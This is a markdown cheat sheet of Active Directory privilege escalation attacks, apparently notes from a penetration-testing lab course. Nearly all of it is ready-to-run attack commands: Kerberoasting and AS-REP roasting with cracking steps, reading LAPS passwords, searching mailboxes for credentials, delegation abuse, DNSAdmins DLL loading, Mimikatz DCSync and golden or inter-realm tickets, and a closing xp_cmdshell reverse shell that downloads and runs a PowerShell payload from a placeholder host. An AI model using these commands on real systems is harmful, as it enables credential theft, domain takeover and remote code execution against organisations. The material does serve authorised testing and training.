# Domain Privilege escalation
* [Kerberoast](#Kerberoast) 
  * [Set SPN](#Set-SPN)
* [AS-REP Roasting](#AS-REP-Roasting) 
  * [Set pre-auth not required](#Set-pre-auth-not-required)  
* [MS Exchange](#MS-Exchange) 
* [Delegation](#Delegation) 
  * [Unconstrained Delegation](#Unconstrained-delegation) 
    * [Printer Bug](#Printer-bug) 
  * [Constrained Delegation](#Constrained-delegation) 
* [DNS Admins](#DNS-Admins) 
* [Child to parent attacks](#Child-to-parent-attacks) 
  * [Trust tickets](#Trust-tickets)
  * [Krbtgt hash](#Krbtgt-hash)
* [Crossforest attacks](#Crossforest-attacks)
  * [Kerberoast](#Kerberoast2)
  * [Trust flow](#Trust-flow) 
  * [Trust abuse SQL](#Trust-abuse-SQL) 

## Kerberoast
- https://github.com/GhostPack/Rubeus
#### Find user accounts used as service accounts
```
. ./GetUserSPNs.ps1
```

```
Get-DomainUser -SPN
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

```
Rubeus.exe kerberoast /stats
```

#### Reguest a TGS
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

```
Request-SPNTicket "<SPN>"
```

```
Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain:<FQDN DOMAIN> /outfile:kerberoast_hashes.txt
Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
```

#### Request TGS Avoid detection
- Based on encryption downgrade for Kerberos Etype (used by likes ATA - 0x17 stands for rc4-hmac).
- Look for kerberoastable accounts that only supports RC4_HMAC
```
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /rc4opsec
```

#### Export ticket using Mimikatz
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Crack the ticket
Crack the password for the serviceaccount
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 13100 -a 0 <HASH FILE> <WORDLIST>
```

```
.\John.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
```

### Set SPN
- If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
#### Enumerate permissions for group on ACL
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<SAMACCOUNTNAME>"}
```

#### Set SPN for the user
- Must be unique accross the forest. 
- Format ```<STRING>/<STRING>```
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatever1>’}
```

#### Then Kerberoast user

## LAPS
- Local Administrator Password Solution (LAPS)
- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.

#### Find all users who can read passwords in clear test machines in OU's
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

#### Read clear-text passwords:
```
Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
```

```
Get-AdmPwdPassword -ComputerName <MACHINE NAME>
```

## AS-REP Roasting
#### Enumerating accounts with kerberos preauth disabled
```
. .\Powerview_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```
```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```


#### Request encrypted AS-REP
```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

#### Enumerate all users with kerberos preauth disabled and request a hash
```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

#### Crack the hash with hashcat
Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Set pre-auth not required
- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
#### Enumerate permissions for group
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Set preauth not required
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

## MS Exchange
- https://github.com/dafthack/MailSniper

#### Enumerate all mailboxes
```
Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName <DOMAIN>\<USER> -Password <PASSWORD>
```

#### Check access to mailboxes with current user
```
Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
```

#### Read e-mails
- The below command looks for terms like pass, creds, credentials from top 100 emails
```
Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
```

## Delegation
### Unconstrained Delegation
- To execute attack owning the server with unconstrained delegation is required!

#### Discover domain computers which have unconstrained delegation
- Domain Controllers always show up, ignore them
```
Get-DomainComputer -UnConstrained
Get-DomainComputer -UnConstrained | select samaccountname
```

#### Check if any DA tokens are available on the unconstrained machine
- Wait for a domain admin to login while checking for tokens
```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

#### Export the TGT ticket
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

```
.\Rubeus.exe monitor /interval:5
```

#### Reuse the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

```
Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
.\Rubeus.exe ptt /tikcet:
```

#### Run DCSync to get credentials:
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

### Printer bug
- A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
- A way to force a TGT of DC on the target machine
- https://github.com/leechristensen/SpoolSample

```
.\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER>
```

### Constrained Delegation
- To execute attack owning the user or server with constrained delegation is required.
#### Enumerate users with contrained delegation enabled
```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Enumerate computers with contrained delegation enabled
```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

### Constrained delegation User
#### Requesting TGT with kekeo
```
./kekeo.exe
Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
```

#### Requesting TGS with kekeo
```
Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<SERVER FQDN>|HTTP/<SERVER FQDN>
```

#### Use Mimikatz to inject the TGS ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

#### Rubeus request and inject TGT + TGS
```
Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /msdsspn:CIFS/<SERVER FQDN> /altservice:HTTP /<SERVER FQDN> /ptt
```

#### Now you can execute commands on the server

### Constrained delegation Computer
#### Requesting TGT with a PC hash
```
./kekeo.exe
Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
```

#### Requesting TGS
No validation for the SPN specified
```
Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

#### Using mimikatz to inject TGS ticket and executing DCsync
```
Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
```

## DNS Admins
#### Enumerate member of the DNS admin group
```
Get-NetGRoupMember “DNSAdmins”
```

#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
Share the directory the ddl is in for everyone so its accessible.
logs all DNS queries on C:\Windows\System32\kiwidns.log 
```
Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

#### Restart DNS
```
Sc \\<dns server> stop dns
Sc \\<dns server> start dns
```

## Child to parent attacks
### Trust tickets
#### Dump trust keys
Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
Look for NTLM hash (second command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
```

#### Create an inter-realm TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
```

#### Create a TGS for a service (kekeo_old)
```
./asktgs.exe <kirbi file> CIFS/<forest dc name>
```

#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
```
./kirbikator.exe lsa .\<kirbi file>
```

#### Check access to server
```
ls \\<servername>\c$ 
```

### Krbtgt hash
#### Get krbtgt hash from dc
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

#### Create TGT
the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
```

#### Inject the ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
```

#### Get SID of enterprise admin
```
Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
```

## Crossforest attacks
### Kerberoast2
#### Enumerate users with SPN cross-forest
```
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
```

#### Request and crack TGS see:
See [Kerberoast](#Kerberoast) 

### Trust flow
#### Dump trust keys
Look for in trust key from child to parent (first command)
Look for NTLM hash (second command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
```

#### Create a TGS for a service (kekeo_old)
```
./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
```

#### Use the TGT
```
./kirbikator.exe lsa <kirbi file>
```

#### Check access to server
```
ls \\<servername>\<share>\
```

### Trust abuse SQL
```
. .\PowerUpSQL.ps1
```

#### Discovery SPN scanning
```
Get-SQLInstanceDomain
```

#### Check accessibility
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
```

#### Gather information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### Search for links to remote servers
```
Get-SQLServerLink -Instance <sql instance> -Verbose
```

#### Enumerate database links
```
Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
```

#### Enable xp_cmdshell
```
Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
```

#### Execute commands
```
Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
